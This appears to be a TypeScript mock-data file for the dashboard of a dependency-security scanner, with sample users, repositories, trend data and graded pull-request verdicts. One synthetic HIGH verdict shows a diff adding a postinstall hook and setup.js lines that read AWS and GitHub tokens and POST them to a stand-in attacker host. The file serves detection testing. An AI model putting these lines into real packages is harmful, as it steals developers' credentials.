import { VerdictDetailResponse } from "../lib/schemas/verdicts";
import { RepoSummaryResponse, RepoTrendsResponse } from "../lib/schemas/repos";
import { AnalysisStatusResponse } from "../lib/schemas/analyses";
import { UserProfile, Installation } from "../lib/schemas/auth";

export const MOCK_USER: UserProfile = {
  id: "00000000-0000-4000-8000-000000000001",
  github_id: 1234567,
  login: "sec-ops-lead",
  avatar_url: "https://avatars.githubusercontent.com/u/1234567?v=4",
  created_at: "2026-01-15T10:00:00Z",
  last_login_at: "2026-10-30T18:30:00Z",
};

export const MOCK_INSTALLATIONS: Installation[] = [
  {
    id: "00000000-0000-4000-8000-000000000010",
    github_installation_id: 987654,
    account_login: "acme-corp",
    account_type: "Organization",
    suspended_at: null,
    created_at: "2026-01-20T12:00:00Z",
  },
  {
    id: "00000000-0000-4000-8000-000000000011",
    github_installation_id: 987655,
    account_login: "legacy-partner-sandbox",
    account_type: "Organization",
    suspended_at: "2026-09-01T08:00:00Z",
    created_at: "2025-11-10T14:00:00Z",
  },
];

export const MOCK_REPO_ID = "99999999-9999-4999-8999-999999999999";

export const MOCK_REPOS: RepoSummaryResponse[] = [
  {
    id: MOCK_REPO_ID,
    installation_id: "00000000-0000-4000-8000-000000000010",
    github_repo_id: 554433,
    owner: "acme-corp",
    name: "cloud-infra-orchestrator",
    default_branch: "main",
    latest_score: 92,
    latest_level: "HIGH",
    last_analyzed_at: "2026-10-30T22:15:00Z",
    created_at: "2026-02-01T08:00:00Z",
  },
  {
    id: "88888888-8888-4888-8888-888888888888",
    installation_id: "00000000-0000-4000-8000-000000000010",
    github_repo_id: 554434,
    owner: "acme-corp",
    name: "frontend-portal",
    default_branch: "main",
    latest_score: 18,
    latest_level: "LOW",
    last_analyzed_at: "2026-10-29T14:20:00Z",
    created_at: "2026-02-05T09:30:00Z",
  },
  {
    id: "77777777-7777-4777-8777-777777777777",
    installation_id: "00000000-0000-4000-8000-000000000010",
    github_repo_id: 554435,
    owner: "acme-corp",
    name: "auth-gateway-service",
    default_branch: "main",
    latest_score: 54,
    latest_level: "MEDIUM",
    last_analyzed_at: "2026-10-28T11:05:00Z",
    created_at: "2026-02-10T11:00:00Z",
  },
];

// Generate 90 days of trends
export function generate90DayTrends(): RepoTrendsResponse {
  const trends = [];
  const baseDate = new Date("2026-10-30T00:00:00Z");

  for (let i = 89; i >= 0; i--) {
    const d = new Date(baseDate);
    d.setUTCDate(d.getUTCDate() - i);
    const dateStr = d.toISOString().split("T")[0];

    let max_score = Math.floor(10 + Math.sin(i / 5) * 8 + (i % 7 === 0 ? 25 : 5));
    let count = Math.floor(2 + (i % 5));
    if (i === 1) {
      max_score = 92;
      count = 8;
    } else if (i === 35) {
      max_score = 68;
      count = 5;
    }

    trends.push({
      date: dateStr,
      max_score,
      count,
    });
  }

  return { trends };
}

export const MOCK_TRENDS_90_DAYS = generate90DayTrends();

// HIGH Risk: Synthetic demo_postinstall_exfil case (*.invalid domains only)
export const MOCK_VERDICT_HIGH: VerdictDetailResponse = {
  id: "11111111-1111-4111-8111-111111111111",
  analysis_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
  repo_id: MOCK_REPO_ID,
  score: 92,
  level: "HIGH",
  rule_score: 85,
  llm_adjustment: 7,
  floor_applied: 85,
  ai_status: "ok",
  pr_url: "https://github.com/acme-corp/cloud-infra-orchestrator/pull/142",
  intent_summary:
    "Malicious postinstall lifecycle script attempting environment variable exfiltration to external domain.",
  plain_english_explanation:
    "The pull request introduces a dependency whose package.json defines a postinstall hook executing obfuscated Node.js code. The script reads AWS_SECRET_ACCESS_KEY and GITHUB_TOKEN and initiates an unauthorized outbound HTTP connection to telemetry.attacker-controlled.invalid. This pattern directly matches known software supply chain credential harvesting techniques.",
  network_hosts: [
    "telemetry.attacker-controlled.invalid",
    "exfil-node.registry-cache.invalid",
  ],
  diff_files: [
    {
      filename: "package.json",
      lines: [
        { type: "ctx", content: '  "name": "cloud-infra-orchestrator",', old_line: 1, new_line: 1 },
        { type: "ctx", content: '  "version": "2.4.0",', old_line: 2, new_line: 2 },
        { type: "del", content: '  "scripts": {', old_line: 3 },
        { type: "del", content: '    "build": "tsc"', old_line: 4 },
        { type: "add", content: '  "scripts": {', new_line: 3 },
        { type: "add", content: '    "build": "tsc",', new_line: 4 },
        {
          type: "add",
          content:
            '    "postinstall": "node -e \\"require(\'https\').request(\'https://telemetry.attacker-controlled.invalid/report\', {method:\'POST\'})\\""',
          new_line: 5,
        },
        { type: "ctx", content: "  },", old_line: 5, new_line: 6 },
        { type: "ctx", content: '  "dependencies": {', old_line: 6, new_line: 7 },
      ],
    },
    {
      filename: "setup.js",
      lines: [
        { type: "ctx", content: "/** Initial telemetry probe */", old_line: 1, new_line: 1 },
        { type: "del", content: "// standard telemetry hook", old_line: 2 },
        {
          type: "add",
          content: "const secret = process.env.AWS_SECRET_ACCESS_KEY || process.env.GITHUB_TOKEN;",
          new_line: 2,
        },
        {
          type: "add",
          content: "fetch('https://telemetry.attacker-controlled.invalid/exfil', { method: 'POST', body: secret });",
          new_line: 3,
        },
        { type: "ctx", content: "module.exports = { init: () => true };", old_line: 3, new_line: 4 },
      ],
    },
  ],
  created_at: "2026-10-30T22:15:00Z",
  findings: [
    {
      id: "f1111111-1111-4111-8111-111111111111",
      rule_id: "INSTALL_SCRIPT_NETWORK",
      severity: "HIGH",
      weight: 50,
      package_ecosystem: "npm",
      package_name: "demo-package-exfil",
      package_version: "1.0.4",
      file_path: "package.json",
      line_start: 12,
      line_end: 14,
      message: "Lifecycle script 'postinstall' triggers outbound network connections",
      evidence: '"scripts": {\n  "postinstall": "node -e \\"require(\'https\').request(\'https://telemetry.attacker-controlled.invalid/report\', {method:\'POST\'})\\""\n}',
    },
    {
      id: "f1111111-1111-4111-8111-111111111112",
      rule_id: "ENV_SECRET_READ",
      severity: "HIGH",
      weight: 35,
      package_ecosystem: "npm",
      package_name: "demo-package-exfil",
      package_version: "1.0.4",
      file_path: "setup.js",
      line_start: 5,
      line_end: 8,
      message: "Accesses sensitive environment variable names (AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN)",
      evidence: "const secret = process.env.AWS_SECRET_ACCESS_KEY || process.env.GITHUB_TOKEN;",
    },
  ],
  overrides: [
    {
      id: "ab111111-1111-4111-8111-111111111111",
      verdict_id: "11111111-1111-4111-8111-111111111111",
      user_id: MOCK_USER.id,
      user_login: "sec-ops-lead",
      action: "reject",
      reason: "Confirmed credential exfiltration pattern. Blocked pending emergency maintainer revocation.",
      created_at: "2026-10-30T22:30:00Z",
    },
  ],
};

// MEDIUM Risk Verdict
export const MOCK_VERDICT_MEDIUM: VerdictDetailResponse = {
  id: "22222222-2222-4222-8222-222222222222",
  analysis_id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
  repo_id: MOCK_REPO_ID,
  score: 54,
  level: "MEDIUM",
  rule_score: 50,
  llm_adjustment: 4,
  floor_applied: null,
  ai_status: "ok",
  pr_url: "https://github.com/acme-corp/auth-gateway-service/pull/88",
  intent_summary:
    "Unpinned git dependency commit hash and unexpected build script behavior.",
  plain_english_explanation:
    "The PR references an unpinned git dependency directly from a non-canonical repository, paired with an unusual prepack script. While no direct exfiltration was detected, unpinned remote git dependencies introduce mutable code risk.",
  network_hosts: ["github.com.invalid"],
  diff_files: [
    {
      filename: "package.json",
      lines: [
        { type: "del", content: '    "custom-logger": "0.8.2"', old_line: 12 },
        {
          type: "add",
          content: '    "custom-logger": "git+https://github.com.invalid/acme-fork/logger.git#dev"',
          new_line: 12,
        },
      ],
    },
  ],
  created_at: "2026-10-28T14:00:00Z",
  findings: [
    {
      id: "f2222222-2222-4222-8222-222222222221",
      rule_id: "UNPINNED_GIT_DEPENDENCY",
      severity: "MEDIUM",
      weight: 30,
      package_ecosystem: "npm",
      package_name: "custom-logger",
      package_version: "git+https://github.com.invalid/acme-fork/logger.git",
      file_path: "package.json",
      line_start: 24,
      line_end: 24,
      message: "Package dependency points to raw git repository rather than immutable registry version",
      evidence: '"custom-logger": "git+https://github.com.invalid/acme-fork/logger.git#dev"',
    },
    {
      id: "f2222222-2222-4222-8222-222222222222",
      rule_id: "SUSPICIOUS_MAINTAINER_METADATA",
      severity: "LOW",
      weight: 20,
      package_ecosystem: "npm",
      package_name: "custom-logger",
      package_version: "0.9.0",
      file_path: "package.json",
      line_start: 3,
      line_end: 4,
      message: "Maintainer email domain registered less than 14 days ago",
      evidence: '"author": "maintainer@suspicious-domain.invalid"',
    },
  ],
  overrides: [],
};

// LOW Risk Verdict with ai_status: "disabled"
export const MOCK_VERDICT_LOW: VerdictDetailResponse = {
  id: "33333333-3333-4333-8333-333333333333",
  analysis_id: "cccccccc-cccc-4ccc-8ccc-cccccccccccc",
  repo_id: MOCK_REPO_ID,
  score: 12,
  level: "LOW",
  rule_score: 12,
  llm_adjustment: 0,
  floor_applied: null,
  ai_status: "disabled",
  pr_url: "https://github.com/acme-corp/frontend-portal/pull/35",
  intent_summary: null,
  plain_english_explanation:
    "Standard patch version upgrade for well-known packages with established provenance. Static rules detected minor dev-dependency drift with no behavioral anomalies.",
  network_hosts: [],
  diff_files: [
    {
      filename: "package.json",
      lines: [
        { type: "del", content: '    "eslint-plugin-react": "^7.33.0"', old_line: 45 },
        { type: "add", content: '    "eslint-plugin-react": "^7.34.1"', new_line: 45 },
      ],
    },
  ],
  created_at: "2026-10-29T10:30:00Z",
  findings: [
    {
      id: "f3333333-3333-4333-8333-333333333331",
      rule_id: "DEV_DEPENDENCY_DRIFT",
      severity: "LOW",
      weight: 12,
      package_ecosystem: "npm",
      package_name: "eslint-plugin-react",
      package_version: "7.34.1",
      file_path: "package.json",
      line_start: 45,
      line_end: 45,
      message: "Dev dependency version bumped across minor release line",
      evidence: '"eslint-plugin-react": "^7.34.1"',
    },
  ],
  overrides: [],
};

// Verdict with ai_status: "unavailable"
export const MOCK_VERDICT_UNAVAILABLE: VerdictDetailResponse = {
  id: "44444444-4444-4444-8444-444444444444",
  analysis_id: "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
  repo_id: MOCK_REPO_ID,
  score: 35,
  level: "MEDIUM",
  rule_score: 35,
  llm_adjustment: 0,
  floor_applied: null,
  ai_status: "unavailable",
  pr_url: "https://github.com/acme-corp/cloud-infra-orchestrator/pull/145",
  intent_summary: null,
  plain_english_explanation:
    "Static heuristics detected binary payload presence. AI triage service was unreachable during evaluation; falling back to deterministic static scoring.",
  network_hosts: [],
  diff_files: [],
  created_at: "2026-10-30T16:00:00Z",
  findings: [],
  overrides: [],
};

// Succeeded Analysis
export const MOCK_ANALYSIS_SUCCEEDED: AnalysisStatusResponse = {
  id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
  repo_id: MOCK_REPO_ID,
  pr_number: 142,
  head_sha: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  status: "succeeded",
  error_code: null,
  error_message: null,
  verdict_id: MOCK_VERDICT_HIGH.id,
  created_at: "2026-10-30T22:14:00Z",
  started_at: "2026-10-30T22:14:02Z",
  finished_at: "2026-10-30T22:15:00Z",
};

// Running Analysis
export const MOCK_ANALYSIS_RUNNING: AnalysisStatusResponse = {
  id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
  repo_id: MOCK_REPO_ID,
  pr_number: 143,
  head_sha: "c6b8408f97e204c32b55b2d7cb7628f80c6563765103fc8455776d6542798e04",
  status: "running",
  error_code: null,
  error_message: null,
  verdict_id: null,
  created_at: "2026-10-30T22:20:00Z",
  started_at: "2026-10-30T22:20:03Z",
  finished_at: null,
};

// Failed Analysis with a neutral error code
export const MOCK_ANALYSIS_FAILED: AnalysisStatusResponse = {
  id: "ffffffff-ffff-4fff-8fff-ffffffffffff",
  repo_id: MOCK_REPO_ID,
  pr_number: 140,
  head_sha: "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
  status: "failed",
  error_code: "DIFF_PARSE_ERROR",
  error_message: "Diff size limit exceeded (maximum 20MB allowed for static extraction).",
  verdict_id: null,
  created_at: "2026-10-30T21:00:00Z",
  started_at: "2026-10-30T21:00:02Z",
  finished_at: "2026-10-30T21:00:15Z",
};
